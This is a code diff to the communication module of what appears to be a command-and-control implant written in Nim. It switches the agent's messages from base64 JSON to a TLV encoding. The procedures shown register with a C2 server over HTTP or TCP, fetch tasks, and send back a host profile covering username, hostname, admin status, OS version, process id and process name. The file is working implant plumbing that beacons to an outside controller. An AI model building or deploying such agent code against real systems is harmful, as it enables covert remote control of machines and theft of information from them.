@@ -1,4 +1,4 @@
-import std/[base64, json]
+import std/[base64, json], tlv
 
 when defined(tcp):
   import std/[net, os]
@@ -9,104 +9,88 @@ import types
 
 proc connectToC2*(app: App) =
   when defined(http) or defined(tcp):
-    let j = %*{
-      "task": "connect",
-      "taskId": -1,
-      "error": "",
-      "data": {}
-    }
+    let b = initBuilder()
+    b.addInt32(-1)
+    b.addString("connect")
+    b.addString("")
+    b.addString("")
+    let j = b.encodeString()
 
   when defined(http):
     try:
       let token = app.httpClient.getContent(app.httpRoot & "/r")
       app.token = token
-      discard app.httpClient.postContent(app.httpRoot & "/t?id=" & app.token, body=encode($j))
+      discard app.httpClient.postContent(app.httpRoot & "/t?id=" & app.token, body=j)
     except OSError: discard
   elif defined(tcp):
     try:
       app.socket = newSocket()
       app.socket.connect(app.ip, Port(app.port))
-      app.socket.send(encode($j) & "\r\n")
+      app.socket.send(j & "\r\n")
     except OSError:
       sleep(app.autoConnectTime)
 
 proc sendData(app: App, data: string) =
   when defined(tcp):
-    try: app.socket.send(encode(data) & "\r\n")
+    try: app.socket.send(data & "\r\n")
     except: app.connectToC2()
   elif defined(http):
     try:
-      discard app.httpClient.postContent(app.httpRoot & "/t?id=" & app.token, body=encode(data))
+      discard app.httpClient.postContent(app.httpRoot & "/t?id=" & app.token, body=data)
       when defined(debug):
         echo "sending " & data
     except OSError:
       return
-
-type DataType* = enum
-  File = "file", Text = "text", Image = "image", Object = "object"
 
 type 
   TaskOutput* = ref object
     task*: string
     taskId*: int
     error*: string
-    data*: JsonNode
-
-proc addData*(output: TaskOutput, dataType: DataType, name: string, contents: string) =
-  let enContents = newJString(encode(contents))
-  if output.data.isNil():
-    output.data = %*{}
-  output.data[name & "::" & $dataType] = enContents
+    data*: string
 
 proc sendOutput*(app: App, taskOutput: TaskOutput) =
-  let j = %*
-    {
-      "task": taskOutput.task,
-      "taskId": taskOutput.taskId,
-      "error": taskOutput.error,
-      "data": taskOutput.data
-    }
-  app.sendData($j)
+  let b = initBuilder()
+  b.addInt32(cast[int32](taskOutput.taskId))
+  b.addString(taskOutput.task)
+  b.addString(taskOutput.error)
+  b.addString(taskOutput.data)
+  app.sendData(b.encodeString())
 
 proc identify*(app: App, taskId: int, hostname: string, isAdmin: bool, username: string, osType: string,
               windowsVersionInfo: tuple[majorVersion: int, minorVersion: int, buildNumber: int],
-              linuxVersionInfo: tuple[kernelVersion: string], ownIntegrity: string, pid: int, pname: string) =
+              pid: int, pname: string) =
   let taskOutput = TaskOutput(
     task: "identify",
     taskId: taskId,
     error: "",
-    data: %*{}
+    data: ""
   )
 
   let j = %*{
+        "username": username,
         "hostname": hostname,
         "isAdmin": isAdmin,
-        "username": username,
         "osType": osType,
-        "ownIntegrity": ownIntegrity,
         "pid": pid,
         "pname": $pname,
         "windowsOsVersionInfo": {
           "majorVersion": windowsVersionInfo.majorVersion,
           "minorVersion": windowsVersionInfo.minorVersion,
           "buildNumber": windowsVersionInfo.buildNumber,
-        },
-        "linuxOsVersionInfo": {
-          "kernelVersion": linuxVersionInfo.kernelVersion
         }
       }
   
-  taskOutput.data = j
+  taskOutput.data = $j
   app.sendOutput(taskOutput)
 
 proc unknownTask*(app: App, taskId: int, taskName: string) =
-  let j = %*
-    {
-      "task": taskName,
-      "taskId": taskId,
-      "error": "unknown task",
-      "data": {}
-    }
+  let b = initBuilder()
+  b.addInt32(cast[int32](taskId))
+  b.addString(taskName)
+  b.addString("unknown task")
+  b.addString("")
+  let j = b.encodeString()
   app.sendData($j)
 
 proc newTaskOutput*(taskId: int): TaskOutput =
@@ -114,7 +98,7 @@ proc newTaskOutput*(taskId: int): TaskOutput =
     task: "output",
     taskId: taskId,
     error: "",
-    data: %*{}
+    data: ""
   )
 
 proc fetchTasks*(app: App): JsonNode =
@@ -130,6 +114,7 @@ proc fetchTasks*(app: App): JsonNode =
     result = parseJson(decoded)
   
   elif defined(http):
+    echo "checking tasks boi"
     var httpResponse: string
     try:
       # fetch the tasks using our token
